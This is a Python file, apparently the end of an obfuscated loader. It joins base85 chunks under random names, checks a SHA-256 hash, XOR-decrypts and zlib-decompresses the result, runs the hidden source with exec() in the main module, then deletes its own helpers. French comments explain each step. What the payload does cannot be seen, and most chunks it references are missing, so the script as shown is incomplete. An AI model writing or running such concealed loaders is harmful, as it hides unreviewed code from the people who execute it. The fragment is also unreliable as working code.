_cv9RHeHmRU3eFX = 'lQAzo<DxcI?F8L1)R)n)wzYZCv^jPlu~k=}#I$;$9a+tg)O0Z#L)T6oz;mc?hSP_9xWP'
_cgekxZlhZUN_Fq = 'jt!*v$UuXi^a22coHFF)2u%kLIMA3G@nrU>*gKo10p8WVO*Km{~+Ro>4<f45PS=IK|6S'
_cy6ycHrkCHL5P3 = '|q~o_}HoXx9w*8fa`020R0G}nG_^TdCxsAqVEI6iR-kP3gT{<h$!IIOL&4ozYRC!#4m('
_coWagApZxZMlM7 = 'SzIjmk6xMvE|5U9bYhpwDC0qki*XN2fn?pwL3Gvjv`)5A#O}%zfr_AD(I%I~e$M1EG05'
_cnvVk0Oehh1xjD = 'Ymahz(fo^xNB~j8M*4EbB+~1|hJ(j^-}J*r`eZhNTv99$LV<A`2hjP>+Ym55Z2B!7aC5'
_cwHOvj9a5TmPnE = 'xqr((n(g<$%K+8~@kaqwsS!seWv6G0Yrva}+H)Cf)TM;k;$XIu4iApp#^orf!&4a81bo'
_cpOv00LRztyqZu = '(_ITWcUG^8^Jt}=^2W&wky}Z1NMg#5yDS(O6T94qT;->gdE$U*7AT<CCzWteo&zpe4i{'
_ch2yEDL3kBduVx = 'KzT$r&+T+*@OqT<X{XcHK*>E!D6H629%?ibr?b#%M@W=B(XZIFpiUycMr-yccNDXpvf-'
_cvkKfVbtrKqV2t = 'ps*3>VWNbDTAVsQ1_`F*z-$>mh~Iiy?#&zq9gy(E@5Tr?SxTW_N>j+<Ht2HxUodUNVar'
_ca82cRsm2mZ53E = '2IoWk*Q}R-w+}x({nz%D+=%y!ot^qea!UfA`Ct+rC6kI0srJVeEWe+^a(O@+l#-*Y0O#'
_cisNs3Bazvn1_H = 'f_+cncz)^j`Guf%4k+~nCGXzQT16qp{EuqIG*I9InGJrC}vXILiT;+Q*ou}s4nbsmS-='
_ceOAurXbWzUPdS = 'JOD6+L9j}k(DzkcabbDj|px*@-HGer^=sOdhD;eBVP`!L*V67J7!O^XY6cHyg(q{&;K@'
_ckVo6Ml26vG7EF = 'IT!1A80_%Tn@@eH@hUZS@oR9C&)+cT=F1#hqst!yW9Ng_X1NFmtk};H#J+wTkA7ZpN?W'
_cyw_f9jjlr3pIe = '16vE0d=xeUATL!iG$s7r=gYO#IPf;0z(Ra{8CXWfg){f0zO@HrI5D=2Af+lEylcE=AHp'
_chCvNrkb3Os1Tv = '(aY82Y-XX4n-mP&=8_9nr~42'

_ppW2dvPK4JsGzF = __import__('base64').b85decode(_cg3Itf0GBfePBR + _clCdtJOobICEDR + _czptwYtWLJlIeQ + _clH5E3IJiDZzXG + _cvSOI3UTSCF5Cf + _cdumW52UJu45i5 + _cd6yb8nde9yYIL + _c_jcCWnfZwCbam + _cyl4iIy8M29xgd + _cthRXDSr0PFcDh + _cw_2ulMLjUyA9Y + _cvRj91xJaJmJNj + _cuVbSkNB7ufUQu + _c_s1AqsyoEFrIb + _coWR53OtrNbkLH + _ck5Qy5xpmeqZRi + _cnXjmveOMzj3cD + _c_FI6sPFoTc8Qu + _ci4iPWEpMNBpO1 + _cmK4JcdUZBfbH3 + _cdhByY4KgEGRdJ + _cepj7v7oBbbpPD + _clmNY4tjjgqusF + _csUroC20zi8m70 + _caNl86d1Ya3Boj + _cyIdqWsEwGv8g2 + _cpPiklSNcC1PQP + _ct7Ydt_tyjL2Jz + _csjKQ80WtQrDb7 + _cpiiqzqGyZfuWX + _cqXAIFLqqzSCVi + _cfZ7bQuqwxv0hM + _cjWdrquZGvxzz9 + _cjVlQlZf5ds5Zl + _c_XUHeJbnAmhIg + _ccBUNwcD72TUcU + _ctl4yy6ruOHo4V + _chLGPGzNILUrdt + _cqcEA5h7clV3E_ + _cxjcrZ3enhNF9R + _c_U1cgiqRcLGMj + _cqQ_uEqj6_NShL + _cxN8K4oxCVwWBA + _c_dEoc3Le431hC + _cg8IfWpKE6EipE + _c_paTDIVq5P2BB + _czHHl737cH9Wmd + _ckczSuBdJVGfSc + _cl2E2A8W9zQ0KO + _cf2Brx51MnYbBL + _cjpf57YRBp7UWg + _ciUWODj_g4mNOJ + _ckeD9D4Dgq5T1G + _cu2YrajLFuIXF8 + _cvA5hxDPBqTcr9 + _ciIMMW258PhJaS + _cay62FlznEy5mX + _cyO4BteSNEYOLd + _cqC7LhTSweiIrz + _ckCy9u9w_a5tGJ + _ctbm5jtAvRYxtU + _coNejbabsyDOWo + _cvdE_IPGfa5vY6 + _ci17ZmwHBrpJ2e + _cuYSAORi5vrANx + _ccqxVek7ohH5KM + _ci9BW3zAOsvgpm + _ccPknqHGsdXj4S + _ccFch7OGAJBldu + _cqyREx9ZIlCkuI + _cehPFsYyUVS_3X + _cxT29wfgCp4oPy + _c_EEO4u9mBnw4t + _ccyHMSgMEXpSjN + _cak9j71Az5cAKJ + _cmBdE97BstBpdw + _clAGvguK2j4XOw + _cgWwqnzuYrCY2I + _cbsdzuf0lf61ys + _cslE8FjyMesoP9 + _cknUS1bmDtJh54 + _cyc5LLfFKb2Mtn + _cv7XzgaPSp42zO + _cvbxZixj3sytcv + _ccoWbPSDVR2W7t + _cf4x54VQ54ILy0 + _crAVcTU62gpG3c + _ca9dBokSFr9qoL + _crftRqBWlDPmT0 + _chNBvwhs9F8yen + _cosWVaUkQPPTcl + _crtf0BipTOPkYQ + _cyebV7Wk0Yrj3J + _cs4n5761qaU27G + _cgaaMpEfWPRUK9 + _comNgjik_3JqXw + _cdrfm5aLox1zqA + _cq9gFNvrLnb3Cq + _cmDfiKzsCgGS9d + _ca8w5lBChC5tGs + _clrFRI9LeLu19b + _cxmk57Erl0lhkD + _ccxVuhGAUBcz40 + _ciYmOgKaCD_XUT + _cx15Zkav9ccZjo + _cweB78m2Qudl3f + _cn57b2_rpnwX73 + _coWF_pZ5jS0Ndg + _caukN3ebdnVFrX + _cmr7v3WEN2blfp + _crAFgA4g5UbcWZ + _cbtlGUilKRorS6 + _cpfSr0qXUwFK3I + _cd7RjCvheDbeIA + _cuv2rb5ZHl36wy + _csmmeZAPJ4H9iH + _cob6y6vca9R8jH + _cdbanEMJs8f9Gi + _ccLgBYgKpBr9T5 + _csN3W92gsKwGGw + _cw0HeG57_z7YWT + _cv7hfdGxMDcEDr + _cjBtQZjLjed4wD + _csQ6EK5wouCyDO + _cgDZ0c5lU2OkLo + _ctnvlYSuQTOHhu + _ct7zWDgVjquXTc + _cegf3psuyYZZWO + _ckHvtZgqGLsIVR + _cozzhWm_3bASdW + _cfcZfXfaZr5Rpt + _cjlqVcYchqGkcN + _cvR0k1W4N8657J + _cdSPTfgGbdvC8N + _cxYYrC8uGFnuZD + _cdMeOwsetrt1C7 + _cg7Lm6EegYpTR6 + _cdOJHAYDIibY8a + _cky6g672p57YF1 + _cvrqRn77IwgofC + _ccGWIkIwzdnN2c + _cyiGm_L9r7YKwi + _cli0eXtRMv98GC + _ceAaNnESRb8Kxy + _cuyMxmRjSeCcI2 + _cjt2R6mg59vE8i + _coGk71rUGda6WF + _cdGG2baJ4j6jDO + _chgvXxPZO_it2E + _cwrsODYOAMW86S + _cj4xJyU2SeZpn5 + _cd8bLAZluCdaxh + _cosUR61Qhx_UJc + _ch23C6NYf7pWtE + _cm7ji6pdhPYTDL + _ckkLpVugaUX03S + _crBdY5BKySqbdY + _cnXjiLdKQ2NuWj + _cirj1nBeEY8yGI + _csXoRwWSCPtpyl + _caubDUSMUlSlkn + _cylslZKVQd8oC2 + _ckkqMSQ6MlZHUB + _cijHWsPiPfH5YA + _cjfSzvMsysQSRT + _caQP0ZucVyu3tT + _cv9RHeHmRU3eFX + _cgekxZlhZUN_Fq + _cy6ycHrkCHL5P3 + _coWagApZxZMlM7 + _cnvVk0Oehh1xjD + _cwHOvj9a5TmPnE + _cpOv00LRztyqZu + _ch2yEDL3kBduVx + _cvkKfVbtrKqV2t + _ca82cRsm2mZ53E + _cisNs3Bazvn1_H + _ceOAurXbWzUPdS + _ckVo6Ml26vG7EF + _cyw_f9jjlr3pIe + _chCvNrkb3Os1Tv)
if __import__('hashlib').sha256(_ppW2dvPK4JsGzF).hexdigest() != '9a0fa01160a3d2f41a3bb1037081da99eebe000929c2842d05bcf660e0ab875a':
    __import__('sys').exit(1)
_xy2rueqFMHAQDf = bytes([133, 108, 45, 187, 237, 116, 147, 195, 88, 57, 141, 9, 254, 131, 229, 153, 3, 133, 254, 108, 116])
_fkoptlugh3HK2kG = bytes([72, 217, 171, 169, 61, 125, 2, 75, 115, 221, 233, 63, 235, 252, 226, 235, 72, 248, 231, 141, 148])

def _fxhdd0O0O6EQIoy(_btQRYwo7IxFyGH, _kpHer_v1aNM0u7):
    return bytes(_btQRYwo7IxFyGH[_ivoT5cawpZFxBx] ^ _kpHer_v1aNM0u7[_ivoT5cawpZFxBx % len(_kpHer_v1aNM0u7)] for _ivoT5cawpZFxBx in range(len(_btQRYwo7IxFyGH)))

def _fdcfqFv75ZS1MDQ(_tbhEb0Snh43mwZ):
    import zlib
    return zlib.decompress(_tbhEb0Snh43mwZ) # Un seul niveau de zlib ici pour simplifier

def _fekDvLC5Dn8zmPR():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xpH7VCzxkEoFkK = _fxhdd0O0O6EQIoy(_ppW2dvPK4JsGzF, _xy2rueqFMHAQDf)
    # 2. Décompression Zlib
    _do8xgT0xCx2TIK = _fdcfqFv75ZS1MDQ(_xpH7VCzxkEoFkK)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _do8xgT0xCx2TIK.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _ngjSr1G54Qd4Mp = _main.__dict__
    _ngjSr1G54Qd4Mp.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _ngjSr1G54Qd4Mp)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fekDvLC5Dn8zmPR()
try:
    del _fxhdd0O0O6EQIoy, _fdcfqFv75ZS1MDQ, _fekDvLC5Dn8zmPR
    del _ppW2dvPK4JsGzF, _xy2rueqFMHAQDf, _fkoptlugh3HK2kG
except:
    pass
